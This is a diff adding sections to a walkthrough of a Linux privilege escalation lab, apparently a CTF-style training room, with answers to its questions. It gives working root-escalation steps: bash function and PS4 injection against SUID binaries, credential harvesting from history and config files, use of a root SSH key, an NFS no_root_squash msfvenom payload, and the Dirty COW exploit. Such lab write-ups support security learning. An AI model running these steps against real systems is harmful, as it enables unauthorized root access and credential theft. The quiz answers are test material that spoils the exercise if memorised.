@@ -83,13 +83,43 @@
 
 <br />
 
+### [14: SUID / SGID Executables - Abusing Shell Features (#1)]()
+#### [&nbsp; 14.1: Read and follow along with the above.]()
 
+<br />
+
+### [15: SUID / SGID Executables - Abusing Shell Features (#2)]()
+#### [&nbsp; 15.1: Read and follow along with the above.]()
 
 <br />
 
-
+### [16: Passwords & Keys - History Files]()
+#### [&nbsp; 16.1: What is the full mysql command the user executed?]()
 
 <br />
+
+### [17: Passwords & Keys - History Files]()
+#### [&nbsp; 17.1: What is the full mysql command the user executed?]()
+
+<br />
+
+### [18: Passwords & Keys - SSH Keys]()
+#### [&nbsp; 18.1: Read and follow along with the above.]()
+
+<br />
+
+### [19: NFS]()
+#### [&nbsp; 19.1: What is the name of the option that disables root squashing?]()
+
+<br />
+
+### [20: Kernel Exploits]()
+#### [&nbsp; 20.1: Read and follow along with the above.]()
+
+<br />
+
+### [21: Privilege Escalation Scripts]()
+#### [&nbsp; 21: Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?]()
 
 <br />
 <br />
@@ -1108,7 +1138,32 @@ No answer needed
 
 ### 14: SUID / SGID Executables - Abusing Shell Features (#1)
 
+The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable `/usr/sbin/service` to start the `apache2` webserver.
 
+We can verify this using the `strings` command:
+
+```
+strings /usr/local/bin/suid-env2
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172800589-e9706957-6083-4020-a99e-b909541fe4fd.png)
+
+In bash versions <4.2-048 it is possible to define shell functions with names resembling file paths, then export those functions so that they are used instead of any actual executable at that file path. To see the bash version on the target machine:
+
+```
+/bin/bash --version
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172801031-526a6403-a58f-4d74-a303-e7c205c99b69.png)
+
+The current version is 4.1.52(1)-release, meaning we can indeed define functions with file names. Let's follow the intructions on the task to create one with the name `/usr/sbin/service` that will execute a new bash shell, using option `-p`to ensure permissions are preserved, and then export the function:
+
+`function /usr/sbin/service { /bin/bash -p; }`
+`export -f /usr/sbin/service`
+
+Once done we can proceed to run the  `/usr/local/bin/suid-env2` executable to get our root shell:
+
+![image](https://user-images.githubusercontent.com/14150485/172802087-a853024c-96ae-4fa2-ba0f-b85b3f7f98c0.png)
 
 <br/>
 
@@ -1122,3 +1177,270 @@ No answer needed
 <br/>
 
 
+### 15: SUID / SGID Executables - Abusing Shell Features (#2)
+
+The example demonstrated in this second part will only work with bash shell versions 4.4 and above.
+
+When in debugging mode, Bash uses the environment variable `PS4` to display an extra prompt for debugging statements.
+
+Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+
+```
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172802831-3042d285-a920-48c9-88b4-b7f3088832b5.png)
+
+This has created a `/tmp/rootbash` executable with SUID that we can use to gain root on the target machine:
+
+```
+/tmp/rootbash -p
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172803148-e86133a5-86b3-4aed-8972-75567186a9cc.png)
+
+
+
+<br/>
+
+#### 15.1: Read and follow along with the above.
+
+```
+No answer needed
+```
+
+<br/>
+<br/>
+
+### 16: Passwords & Keys - History Files
+
+A common error attackers can exploit for privilege escalation purposes is accidental password input on the command line instead of a password prompt, as those are likely to be recorded in a history file. We can view the contents of all the hidden history files in the user's home directory:
+
+```
+cat ~/.*history | less
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172804198-d2d4e5c6-2ad8-492c-8665-8db3d0f18c4d.png)
+
+Looks like someone attempted to connect to a MySQL server at some point and accidentally left no spaces after the `-u` and `-p` options used for `username` and `password` input espectively, meaning we can attempt to escalate to a higher privilege using this data:
+
+```
+su root
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172804748-44eab956-525c-461c-91b8-0893fa23ff64.png)
+
+<br/>
+
+#### 16: What is the full mysql command the user executed?
+
+<br/>
+
+The full string was printed upon viewing the history file earlier. The answer is:
+
+```
+mysql -h somehost.local -uroot -ppassword123
+```
+
+<br/>
+<br/>
+
+### 17: Passwords & Keys - Config Files
+
+Although not a common occurrence, configuration files can sometimes include passwords in plaintext or otherwise reversible formats attackers can use. For the example in this task we will be using an OpenVPN file, `/home/user/myvpn.ovpn`. Let's view its contents:
+
+```
+cat /home/user/myvpn.ovpn
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172807177-d581bb64-305b-44d4-ba14-b57203dd4bd4.png)
+
+What we find is an `auth-user-pass` reference pointing at the `/etc/openvpn/auth.txt` file, the contents of which most likely hold valuable information.
+
+```
+cat /etc/openvpn/auth.txt
+```
+![image](https://user-images.githubusercontent.com/14150485/172807585-04a1dd7e-7da4-49ea-a9e5-9952f50cd1e1.png)
+
+This should suffice for us to escalate to root:
+
+```
+su root
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172807808-10a9efad-e79a-4734-883a-0cbb1eea093f.png)
+
+<br/>
+
+#### 17.1: What file did you find the root user's credentials in? 
+
+```
+/etc/openvpn/auth.txt
+```
+
+<br/>
+<br/>
+
+### 18: Passwords & Keys - SSH Keys
+
+One of the most common mistakes attackers take advantage of to escalate privileges is incorrect file permissions. In this task we will be searching for hidden files that we can use to gain root access. Let's list the contents of the root directory:
+
+```
+ls -la /
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172809353-d8c075e8-0dfa-4aac-8b8e-ea31bf657a11.png)
+
+There is a hidden folder called `.ssh`.
+
+```
+ls -la /.ssh
+```
+![image](https://user-images.githubusercontent.com/14150485/172810277-5f26f18d-769b-407d-a068-9123814d86c7.png)
+
+A file called `root_key` is located under this directory, which upon inspection using the `file` command appears to be an RSA private key, typically used for authentication purposes with SSH.
+
+![image](https://user-images.githubusercontent.com/14150485/172810791-3ae954a2-1b09-42fc-a0af-e37e1fd17e60.png)
+
+We can view the file contents and copy them over to a newly created file on our machine that we can use to connect to the target via SSH. Please ensure the permissions of this file are sufficient, otherwise SSH will refuse to use it:
+
+```
+chmod 600 root_key
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172824993-2a2bd3ca-f02a-4880-a82e-08026b8e0f2c.png)
+
+Now we can connect to the target via `ssh` from our machine using the RSA file:
+
+```
+ssh -i FILE_NAME root@TARGET_IP
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172825171-eb5f6482-405b-4278-93bb-9ca99a5cfc5e.png)
+
+<br/>
+
+#### 18.1: Read and follow along with the above.
+
+```
+No answer needed
+```
+
+<br/>
+<br/>
+
+### 19: NFS
+
+Files created via NFS inherit the remote user's ID. If the user is root and root squashing is enabled, the ID will instead be set to `nobody`. We can check the NFS configuration on this machine:
+
+```
+cat /etc/exports
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172826152-e0de3b10-ea9d-4fa9-a9fb-5ada8866a28f.png)
+
+Root squashing on the `/tmp` share seems to be disabled. Follow the instructions to switch to root:
+
+```
+su root
+```
+
+Now as root on our local machine we will be creating a mount point that we can use to mount the `/tmp` share - Please note that `vers=3` worked for me when mounting the share:
+
+`mkdir /tmp/nfs`
+`mount -o rw,vers=2 REMOTE_IP:/tmp /tmp/nfs`
+
+![image](https://user-images.githubusercontent.com/14150485/172828679-2f6b9150-920c-484f-8cb8-e67566f5421e.png)
+
+Follow the instructions to generate an `mfsvenom` payload in the mounted share:
+
+```
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172828996-2201ee3b-3804-48a7-8b62-7f40d8b99b8b.png)
+
+Now set SUID permissions on the payload file:
+
+```
+chmod +xs /tmp/nfs/shell.elf
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172829165-568c0701-f950-4a72-a3ee-ca05430afb34.png)
+
+Running the payload from the target machine will escalate the privileges to root:
+
+```
+/tmp/shell.elf
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172829346-0bee6d14-7cd5-4925-84ca-03a6cfc026e3.png)
+
+<br/>
+
+#### 19.1: What is the name of the option that disables root squashing?
+
+```
+no_root_squash
+```
+
+<br/>
+<br/>
+
+### 20: Kernel Exploits
+
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort. In this task we will be running the `Linux Exploit Suggester 2` tool to identify potential kernel exploits on the target system:
+
+```
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+```
+
+The `Dirty COW` exploit comes up on the list. An exploit for this can be found under `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. The xploit essentially replaces the SUID file `/usr/bin/passwd` with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak). Let's proceed to compile the code and run it.
+
+`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w`
+`./c0w`
+
+![image](https://user-images.githubusercontent.com/14150485/172830885-11c951bc-b68e-4300-a9d2-392227275ce6.png)
+
+Once the exploit finishes running, executing `/usr/bin/passwd` will spawn a root shell:
+
+```
+/usr/bin/passwd
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172830971-f30be9c9-3968-42cb-920f-0d0db0720d4b.png)
+
+<br/>
+
+Remember to restore the original `/usr/bin/passwd` file and exit the root shell before continuing!
+
+`mv /tmp/bak /usr/bin/passwd`
+<br/>
+`exit`
+
+<br/>
+
+#### 20.1: Read and follow along with the above.
+
+```
+No answer needed
+```
+
+<br/>
+<br/>
+
+### 21: Privilege Escalation Scripts
+
+
+
+<br/>
+
+#### 21.1: Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?
+
+The scripts are located under the `/home/user/tools/privesc-scripts` folder. Running them and examining their outputs we notice that they picked up most of the scenarios we worked on in this room. While scripts are useful and provide detailed information with minimal effort from us, understanding how Linux systems work and how we can manually take advantage of misconfigurations for privilege escalation purposes is key knowledge that takes a significant amount of time, practice and exposure to achieve.
+
+```
+No answer needed
+```
+
+<br/>
